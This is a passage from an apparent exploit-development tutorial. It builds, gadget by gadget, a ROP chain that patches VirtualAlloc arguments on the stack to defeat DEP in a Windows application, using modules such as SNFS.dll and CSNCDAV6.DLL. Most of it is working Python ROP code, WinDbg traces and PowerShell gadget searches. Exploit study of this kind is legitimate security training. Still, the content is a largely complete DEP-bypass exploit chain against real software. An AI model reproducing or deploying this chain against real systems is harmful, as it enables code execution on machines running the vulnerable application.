    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
    SNFS!_heap_init+0x5c:
    1001442a c3              ret
    ```
    
3. We clear our the `EDX` register.
4. We push `EBP` onto the stack (our previous `EAX`) value. We then copy the location referenced at the address in `EAX` which is `0x77383db0` our resolved `KERNEL32!VirtualAlloc` address into `EDX` using the addition. `0 + ADDRESS = ADDRESS`. Finally the `POP EAX` instruction insure that the `EAX` value is restored to the previous value before step 1.
    
    ```python
    rop += pack("<L", (0x10019c61)) # push ebp ; add edx, dword [eax] ; pop eax ; ret  
    
    0:001> p
    eax=100252e0 ebx=42424242 ecx=ffffffe4 edx=00000000 esi=42424242 edi=00669360
    eip=10019c61 esp=019ee33c ebp=019ee2f0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    SNFS!_set_old_sbh_threshold+0x14:
    10019c61 55              push    ebp
    0:001> p
    eax=100252e0 ebx=42424242 ecx=ffffffe4 edx=00000000 esi=42424242 edi=00669360
    eip=10019c62 esp=019ee338 ebp=019ee2f0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    SNFS!_set_old_sbh_threshold+0x15:
    10019c62 0310            add     edx,dword ptr [eax]  ds:0023:100252e0={KERNEL32!VirtualAllocStub (76ca4d30)}
    0:001> p
    eax=100252e0 ebx=42424242 ecx=ffffffe4 edx=76ca4d30 esi=42424242 edi=00669360
    eip=10019c64 esp=019ee338 ebp=019ee2f0 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    SNFS!_set_old_sbh_threshold+0x17:
    10019c64 58              pop     eax
    0:001> p
    eax=019ee2f0 ebx=42424242 ecx=ffffffe4 edx=76ca4d30 esi=42424242 edi=00669360
    eip=10019c65 esp=019ee33c ebp=019ee2f0 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    SNFS!_set_old_sbh_threshold+0x18:
    10019c65 c3              ret
    
    ```
    
5. Finally we write the value in `EDX` which is now our `KERNEL32!VirtualAlloc` address to the location pointed to in `EAX` effectively patching our first address.
    
    ```python
    rop += pack("<L", (0x10021d7c)) # mov dword [eax], edx ; ret  ;
    
    eax=019ee2f0 ebx=42424242 ecx=ffffffe4 edx=76ca4d30 esi=42424242 edi=00669360
    eip=10021d7c esp=019ee340 ebp=019ee2f0 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    SNFS!std::basic_streambuf<unsigned short,std::char_traits<unsigned short> >::_Init+0x3f:
    10021d7c 8910            mov     dword ptr [eax],edx  ds:0023:019ee2f0=45454545
    0:001> p
    eax=019ee2f0 ebx=42424242 ecx=ffffffe4 edx=76ca4d30 esi=42424242 edi=00669360
    eip=10021d7e esp=019ee340 ebp=019ee2f0 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    SNFS!std::basic_streambuf<unsigned short,std::char_traits<unsigned short> >::_Init+0x41:
    10021d7e c3              ret
    ```
    

Let’s confirm everything is where it should be:

```python
0:001> dds eax L5
019ee2f0  76ca4d30 KERNEL32!VirtualAllocStub
019ee2f4  46464646
019ee2f8  00000000
019ee2fc  48484848
019ee300  00000000
```

We have successfully patched the address of `VirtualAlloc` at runtime. Let’s recap our steps:

1. Obtain the IAT address of `VirtualAlloc`
2. ROP chain to obtain the stack address that contains the `VirtualAlloc` placeholder
3. ROP chain to fetch the `VirtualAlloc` address
4. ROP chain to patch the `VirtualAlloc` address

### Patching Return Address (#retadd)

Because during ROP chains we are modifying the return address, once we within our ROP chain, we returned into it, therefore we won’t have valid return address. We therefore need to patch it so that our shellcode is next. We need to shift execution to our `(0x46464646)) # Shellcode Return Address` location. We follow the same 3 step recipe as before.

- Align `EAX` with a placeholder value for the return address
- Dynamically locate the address of our return address
- Patch the placeholder value

We noted that our `VirtualAlloc` address to which we want to return should be 4 bytes bigger. We therefore increase `EAX` which contains the address to `VirtualAlloc` by four bytes and write our return address. Something like `ADD EAX, 0x04` would be perfect, however, no such gadget exist, however, increasing by only `0x01` can be found. We analyze the gadgets to find one that doesn’t have adverse effects on our ROP chain.

```python
gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(inc eax).*?((retn  ;)|(ret  ;))" | Select-String -Pattern "(leave)" -NotMatch
ROPS\SNFS.dll.txt:7625:0x1000f978: inc eax ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:7626:0x10011b04: inc eax ; ret  ;  (1 found)

#Patching Return Address by 4 bytes
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
```

We want our `EAX` register to point to `0x46464646`, which is the address to the placeholder value for the return address. We will patch the value again using the `mov dword [eax], ecx ; ret  ;` instructions. Since we don't know our shellcode address which will be after the ROP chain, we add a fixed bytes value such as `0x210`. 

Considering `0x210` contains a null byte we will have to use some tricks to get the value read. We will be popping the negative fixed bytes into a register e.g. `0xfffffdf0` and then subtract it from `EAX` or another register holding the adjusted return address. Ultimately, we want the `EAX` value to point to our placeholder return address, and our `ECX` register to point to location which is equal to our placeholder address + our `210` bytes. We look for gadgets that can be used during our `SUB` function.

```python
 gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(SUB E[a-z][a-z], E[a-z][a-z]).*?((retn  ;)|(ret  ;))" | Select-String -Pattern "(sub eax, ecx)" -NotMatch

ROPS\NLS.dll.txt:3882:0x10006c71: cmc  ; sub eax, edx ; sar eax, 1  ; add eax, eax ; ret  ;  (1 found)
ROPS\NLS.dll.txt:3883:0x10006c3a: cmc  ; sub eax, edx ; sar eax, 1  ; ret  ;  (1 found)
ROPS\NLS.dll.txt:6471:0x10006f77: mov eax, esi ; pop esi ; sub eax, edx ; pop edi ; ret  ;  (1 found)
ROPS\NLS.dll.txt:8433:0x10006f79: pop esi ; sub eax, edx ; pop edi ; ret  ;  (1 found)
ROPS\NLS.dll.txt:12151:0x10006f7a: sub eax, edx ; pop edi ; ret  ;  (1 found)
ROPS\NLS.dll.txt:12152:0x10006c59: sub eax, edx ; ret  ;  (1 found)
ROPS\NLS.dll.txt:12153:0x10006c72: sub eax, edx ; sar eax, 1  ; add eax, eax ; ret  ;  (1 found)
ROPS\NLS.dll.txt:12154:0x10006c3b: sub eax, edx ; sar eax, 1  ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:18018:0x10019f0d: sub eax, edx ; pop esi ; sar eax, 0x04 ; lea eax, dword [eax+ecx+0x08] ; ret  ;  (1 found)

gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(SUB EAX, ECX).*?((retn  ;)|(ret  ;))" | Select-String -Pattern "(leave)" -NotMatch
ROPS\SNFS.dll.txt:18013:0x1000d2c4: sub eax, ecx ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:18014:0x1000d2ce: sub eax, ecx ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:18015:0x1000d2ba: sub eax, ecx ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:18016:0x1000d2d8: sub eax, ecx ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:10865:0x5100b2d4: sub eax, ecx ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:10866:0x5100b2ca: sub eax, ecx ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:10867:0x5100b2e8: sub eax, ecx ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:10868:0x5100b2de: sub eax, ecx ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:18019:0x10014f20: sub ebp, ebx ; or esi, esi ; ret  ;  (1 found)
```

We find that all gadgets require us to store the value within `EAX`, which is problematic, considering we are using the value to store our return address. 

We therefore recap if we don’t have other gadgets which can be moved to patch our return address, with the requirement that the final address are stored in `EAX` as we only have `SUB EAX` instructions to use. Let’s re-evaluate our options:

- move the value in `EAX` to another register and move it back later
- use other gadgets, we will have to work bottom up
- we utilise another gadget which doesn’t need another register e.g. add 0x20 multiple times

```python

+--    NCDAV6.DLL.txt:9272:0x50204f94: sub eax, ecx ; ret  ;  (1 found)
+--    NCDAV6.DLL.txt:9273:0x50204f9e: sub eax, ecx ; ret  ;  (1 found)
+--    NCDAV6.DLL.txt:9274:0x50204f8a: sub eax, ecx ; ret  ;  (1 found)
+--    NCDAV6.DLL.txt:9275:0x50204fa8: sub eax, ecx ; ret  ;  (1 found)

#can increase by 1 then decrease 0x20 bad char

+--    MTPAV6.DLL.txt:10865:0x5100b2d4: sub eax, ecx ; ret  ;  (1 found)
+--    MTPAV6.DLL.txt:10866:0x5100b2ca: sub eax, ecx ; ret  ;  (1 found)
+--    MTPAV6.DLL.txt:10867:0x5100b2e8: sub eax, ecx ; ret  ;  (1 found)
+--    MTPAV6.DLL.txt:10868:0x5100b2de: sub eax, ecx ; ret  ;  (1 found)

#can double up, 0x0b bad char

+--    MTPAV6.DLL.txt:10864:0x5100f5f9: sub eax, ecx ; pop esi ; pop ebp ; ret  ;  (1 found)

#might be useful

+--    SNFS.dll.txt:17999:0x100113de: sub eax, 0x20 ; pop ebx ; ret  ;  (1 found)
+--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
```

Interestingly we see our very last gadget might be the best option. We would have to utilise the instruction several times, but it would not require other complex register movements. Before we continue we also check if we can perhaps not find other gadgets that can reference our address. So in summary, this instruction moves the 32-bit value stored in the `EAX` register to the memory location pointed to by the `ESI` register.

```python
gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(mov dword \[esi], eax).*?((retn  ;)|(ret  ;))"

ROPS\libcclog.dll.txt:874:0x100033e9: add byte [eax], al ; add esp, 0x08 ; mov dword [esi], eax ; pop esi ; ret  ;  (1 found)
ROPS\libcclog.dll.txt:1042:0x1000f8c1: add byte [eax], al ; mov dword [esi], eax ; pop esi ; ret  ;  (1 found)
ROPS\libcclog.dll.txt:2396:0x100033eb: add esp, 0x08 ; mov dword [esi], eax ; pop esi ; ret  ;  (1 found)
ROPS\libcclog.dll.txt:3854:0x1000daef: dec eax ; mov dword [esi], eax ; mov al, 0x01 ; pop esi ; ret  ;  (1 found)
ROPS\libcclog.dll.txt:5046:0x100033ec: les ecx,  [eax] ; mov dword [esi], eax ; pop esi ; ret  ;  (1 found)
ROPS\libcclog.dll.txt:5823:0x1000daf0: mov dword [esi], eax ; mov al, 0x01 ; pop esi ; ret  ;  (1 found)
ROPS\libcclog.dll.txt:5824:0x1000ddda: mov dword [esi], eax ; pop esi ; mov byte [ecx+eax], 0x00000000 ; mov al, 0x01 ; ret  ;  (1 found)
ROPS\libcclog.dll.txt:5825:0x100033ee: mov dword [esi], eax ; pop esi ; ret  ;  (1 found)
ROPS\libcclog.dll.txt:5826:0x1000f8c3: mov dword [esi], eax ; pop esi ; ret  ;  (1 found)
ROPS\NLS.dll.txt:6195:0x100160a8: mov dword [esi], eax ; mov dword [esi+0x08], eax ; mov dword [esi+0x04], eax ; pop esi ; ret  ;  (1 found)
ROPS\NLS.dll.txt:6196:0x1000b698: mov dword [esi], eax ; pop esi ; mov eax, ebx ; pop ebx ; ret  ;  (1 found)
ROPS\sncclient.dll.txt:4378:0x100107aa: mov dword [esi], eax ; pop edi ; mov eax, 0x00000001 ; pop esi ; add esp, 0x00001004 ; ret  ;  (1 found)
ROPS\sncclient.dll.txt:4379:0x10010794: mov dword [esi], eax ; xor eax, eax ; pop edi ; pop esi ; add esp, 0x00001004 ; ret  ;  (1 found)
**ROPS\SNFS.dll.txt:9702:0x1001bfe5: mov dword [esi], eax ; mov dword [esi+0x08], eax ; mov dword [esi+0x04], eax ; pop esi ; ret  ;  (1 found)**
ROPS\SNFS.dll.txt:9703:0x1000fc64: mov dword [esi], eax ; or eax, 0xFFFFFFFF ; pop esi ; pop ebx ; ret  ;  (1 found)
**ROPS\SNFS.dll.txt:9704:0x10012f97: mov dword [esi], eax ; pop eax ; pop esi ; ret  ;  (1 found)**
ROPS\SNFS.dll.txt:13705:0x10012f95: push 0x00000001 ; mov dword [esi], eax ; pop eax ; pop esi ; ret  ;  (1 found)

#Moving EAX to ESI
**+--    NCDAV6.DLL.txt:6968:0x5021809b: push eax ; pop esi ; pop ebp ; ret  ;  (1 found)**

```

From the above we also reference potential areas where we can move our `EAX` address. We find that we have a potential winner as a certain gadget would utilise `EAX` and `ESI` and we have a way to move `EAX` to `ESI`.

```python
### Patching Return Address by 4 bytes
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  

# We move EAX to ESI
rop += pack("<L", (0x5021809b)) # push eax ; pop esi ; pop ebp ; ret  ; 
rop += pack("<L", (0x42424242)) # pop ebp

#increase EAX 0x20 x 14 
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx

# write eax into location pointed by ESI
rop += pack("<L", (0x1001bfe5)) # +--    NFS.dll.txt:9702:0x1001bfe5: mov dword [esi], eax ; mov dword [esi+0x08], eax ; mov dword [esi+0x04], eax ; pop esi ; ret  ; 
rop += pack("<L", (0x42424242)) # pop esi
```

We have a winning way now, and update our ROP gadget as outlined below. We move our `EAX` value to `ESI`, then we increase `EAX` by `0x20` several times until we have around `200` bytes or more. We then move the value in the `eax` register into the memory location pointed to by the `esi` register. We have successfully patched our return address.

```python
0:006> r
eax=0190e434 ebx=42424242 ecx=100252e0 edx=770313a0 esi=0190e2f4 edi=00669360
eip=1001bfed esp=0190e3a0 ebp=42424242 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
SNFS!_freebuf+0x29:
1001bfed 5e              pop     esi

0:006> dds esi -4 L5
0190e2f0  100252e0 SNFS!_imp__VirtualAlloc
0190e2f4  0190e434
0190e2f8  0190e434
0190e2fc  0190e434
0190e300  00000000

0:006> dds eax
0190e434  43434343
0190e438  43434343
0190e43c  43434343
```

Now before we continue moving towards patching the arguments let’s recap our register values, `ECX` holds our address pointing to our Return Address. 

```python
va  = pack("<L", (0x45454545)) # VirutalAlloc Address
va += pack("<L", (0x46464646)) # Return Address (Shellcode on stack)
va += pack("<L", (0x47474747)) # lpAddress (Shellcode on stack)
va += pack("<L", (0x48484848)) # dwSize 
va += pack("<L", (0x49494949)) # flAllocationType 
va += pack("<L", (0x51515151)) # flProtect
```

### Patching Arguments (#parg)

Now that we have our `VirtualAlloc` address stored, and our `shellcode` address, we need to start adding the arguments required by `VirtualAlloc` to disable DEP. Let’s recap our function prototype and requirements. 

```cpp
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType, 
  [in]           DWORD  flProtect
);

// lpAddress => shellcode address 
// dwSize => 0x01 to 0x1000 ; size of the memory region we want to change, any value between 
// flAllocationType => 0x00001000 ; which is MEM_COMMIT
// flProtect => 0x00000040 ; 0x40 which is PAGE_EXECUTE_READWRITE

```

Before we continue we look at our registers and stack and we immediately notice our very last instruction already aligned our `lpAddress` for us. Effectively the address already points to our shellcode as shown below.

```python
0x1001bfe5: mov dword [esi], eax ; mov dword [esi+0x08], eax ; mov dword [esi+0x04], eax ; pop esi ; ret  ;

0:006> dds esi -4 L5
0190e2f0  100252e0 SNFS!_imp__VirtualAlloc
0190e2f4  0190e434
0190e2f8  0190e434
0190e2fc  0190e434
0190e300  00000000
0:006> r
eax=0190e434 ebx=42424242 ecx=100252e0 edx=770313a0 esi=0190e2f4 edi=00669360
eip=1001bfed esp=0190e3a0 ebp=42424242 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
SNFS!_freebuf+0x29:
1001bfed 5e              pop     esi
0:006> dds eax
0190e434  43434343
0190e438  43434343
```

The only problem we have now is, that we don’t hold any registers anymore that has our location as `ESI` was popped off the stack. We could potentially obtain our address again by reversing our `EAX` value, which at this point still hold the value pointing to our shellcode. We can go back in our chain and look to copy `EAX` before or `ESI` to another register we restore afterwards, or we can reverse the addition of bytes added to `EAX` initially.

```python
 moving ESI to ECX
-> mov ecx, esi
-> xchg ecx, esi
-> lea ecx, [esi]
**-> push esi; pop ecx**
-> xor ecx, ecx; add ecx, esi or xor ecx, esi

ROPS\CSNCDAV6.DLL.txt:6963:0x5021c800: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6950:0x502016df: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6951:0x502024c6: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6952:0x502029f8: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6953:0x5020478c: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6954:0x502035ac: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6955:0x50204bf2: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6956:0x50204df5: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6957:0x50204e04: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6958:0x50204e13: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6959:0x50204e82: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6960:0x5021810a: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6961:0x502180ce: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6962:0x50218139: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:6963:0x5021c800: push eax ; pop ebp ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:14698:0x10019c61: push ebp ; add edx, dword [eax] ; pop eax ; ret  ;  (1 found)
```

We add the following gadgets to our ROP chain that will copy `EAX` before it is modified to `EBP` and we then simply restore the value of `EAX` before we move onwards.

```python
...................
# We copy EAX to ESI
rop += pack("<L", (0x5021809b)) # push eax ; pop esi ; pop ebp ; ret  ; 
rop += pack("<L", (0x42424242)) # pop ebp

rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ;  (1 found)

#increase EAX 0x20 x 12 
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.
...................

...................
# write eax into location pointed by ESI
rop += pack("<L", (0x1001bfe5)) # NFS.dll.txt:9702:0x1001bfe5: mov dword [esi], eax ; mov dword [esi+0x08], eax ; mov dword [esi+0x04], eax ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi
#restore eax to the correct value from ebp
rop += pack("<L", (0x10019c61)) # ROPS\SNFS.dll.txt:14698:0x10019c61: push ebp ; add edx, dword [eax] ; pop eax ; ret  ;
...................
```

We confirm that everything works fine, and we note that `EAX` holds the value to our return address, however our `lpAddress` has already been matched as previously shown.

```python
0:006> dds eax - 4 L5
0191e2f0  100252e0 SNFS!_imp__VirtualAlloc
0191e2f4  0191e434
0191e2f8  0191e434
0191e2fc  0191e434
0191e300  00000000

0:006> r
eax=0191e2f4 ebx=42424242 ecx=100252e0 edx=ba4656e3 esi=42424242 edi=00669360
eip=10019c65 esp=0191e3ac ebp=0191e2f4 iopl=0         ov up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a82
SNFS!_set_old_sbh_threshold+0x18:
10019c65 c3              ret
```

lpAddress

This argument should be equal to our shellcode address e.g. same value as our return address. We have already confirmed this is right, however our `EAX` value is off by `4 bytes` and we adjust the value to correctly align with the `lpAddress` parameter.

- Increase the `EAX` register by four bytes to align with next API skeleton call

```python
#1. We increase the stack with 4 bytes again
### Patching Return Address by 4 bytes
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;
```

dwsize

DWSize should be `0x01`. Currently we have `EAX` holding the location to `lpAddress` and `EBP` holding the location to our return address. 

- We pop value `0xfffff` into `EAX` and negate it
- We then copy the `EAX` value to `ECX` so that we can utilise it to write to the memory location pointed to in `EAX`
- We add a valid memory location to `EAX` as the previous instruction will result in a non existing memory location that will be reference in the next gadget
- We restore our previous value from `EBP` into `EAX` undoing the `lpAddress` and other alignments, however, we can redo them
- We redo the alignment of `EAX` to point to the correct memory location for `dwsize` e.g. `EBP` + `8 bytes`
- Write `ECX` to the memory location held in `EAX` to patch the `dwSize` argument

```python

##################################
rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
rop += pack("<L", (0xffffffff)) # -1 value that is negated
rop += pack("<L", (0x10015a25)) # NFS.dll.txt:10993:0x10015a25: neg eax ; pop edi ; pop esi ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop edi
rop += pack("<L", (0x42424242)) # pop esi

#copy eax to ecx
rop += pack("<L", (0x502162b5)) # push eax ; and al, 0x59 ; pop ecx ; ret  ;  (1 found)

#EAX will need valid memory address for the next gadget so we just add the virtualloc address
rop += pack("<L", (0x5021376f)) # pop eax ; ret  ;
rop += pack("<L", (0x100252E0)) # VirtualAlloc Address

#restore eax from ebp
rop += pack("<L", (0x10019c61)) # ROPS\SNFS.dll.txt:14698:0x10019c61: push ebp ; add edx, dword [eax] ; pop eax ; ret  

#readjust the eax value to align
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;

rop += pack("<L", (0x1001526c)) # mov dword [eax], ecx ; ret  ;
```

We make sure that everything worked correctly and aligns as it should.

```python
0:006> dds eax -c L5
018be2f0  100252e0 SNFS!_imp__VirtualAlloc
018be2f4  018be434
018be2f8  018be434
018be2fc  00000001
018be300  00000000
```

For the above used the `NEG` bypass. We can attempt to utilise `XOR EAX, EAX` and `INC EAX` instead. We also note that some of our previous gadgets has become redudent and we remove them to cleanup the ROP chain. The below are removed.

```python
# write eax into location pointed by ESI
rop += pack("<L", (0x1001bfe5)) # NFS.dll.txt:9702:0x1001bfe5: mov dword [esi], eax ; mov dword [esi+0x08], eax ; mov dword [esi+0x04], eax ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi

~~#restore eax to the correct value from ebp
rop += pack("<L", (0x10019c61)) # ROPS\SNFS.dll.txt:14698:0x10019c61: push ebp ; add edx, dword [eax] ; pop eax ; ret  ;  (1 found)

#####PATCHING ARGUMENTS
### align EAX with lpaddress
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;~~  

### dwsize
rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
rop += pack("<L", (0xffffffff)) # -1 value that is negated
```

flAllocationType

Should be set to `0x1000`. We won’t be able to use negation. We will use arithmetic again e.g. `0x80808080` - `0x1000` which will result in `0x7f7f8f80` which is null bye free then add the two together. We use various of our previous gadgets so this goes much quicker.

- We align `EAX` to point to our next address
- We make a copy of our `EAX` register which holds our `flAllocationType` address in `EBP`
- Pop `0x80808080` into `EAX` and pop `0x7f7f8f80` into `ECX`
- We then add `ECX` to `EAX` and copy the `EAX` result to `ECX`
- Finally we add a valid address into `EAX` so we can complete the next gadget
- The next gadget restores `EBP` back into `EAX`
- Our final gadget writes the value of `ECX` into the memory location pointed to in `EAX`

```python
0:077> ? 1000 - 80808080
Evaluate expression: -2155901056 = ffffffff`7f7f8f80
0:077> ? 80808080 + 7f7f8f80
Evaluate expression: 4294971392 = 00000001`00001000

#flAllocationType
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;

rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ; 

rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
rop += pack("<L", (0x80808080)) # first value to be added

rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0x7f7f8f80)) # second value to be added

rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi

rop += pack("<L", (0x502162b5)) # push eax ; and al, 0x59 ; pop ecx ; ret  ; 

#EAX will need valid memory address for the next gadget so we just add the virtualloc address
rop += pack("<L", (0x5021376f)) # pop eax ; ret  ;
rop += pack("<L", (0x100252E0)) # VirtualAlloc Address

#restore eax from ebp
rop += pack("<L", (0x10019c61)) # push ebp ; add edx, dword [eax] ; pop eax ; ret

rop += pack("<L", (0x1001526c)) # mov dword [eax], ecx ; ret  ;
```

We confirm that everything is working and move to the next argument.

```python
0:001> dds eax  L4
019de300  00001000
019de304  51515151
019de308  019de30c
019de30c  10012394 SNFS!_flush+0x57
```

flProtect

Should be `0x40` and we will utilise the same technique as before as it includes a null bye.

```python
0:077> ?40 - 80808080
Evaluate expression: -2155905088 = ffffffff`7f7f7fc0
0:077> ? 80808080 + 7f7f7fc0
Evaluate expression: 4294967360 = 00000001`00000040

#flProtect
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;

rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ; 

rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
rop += pack("<L", (0x80808080)) # first value to be added

rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0x7f7f7fc0)) # second value to be added

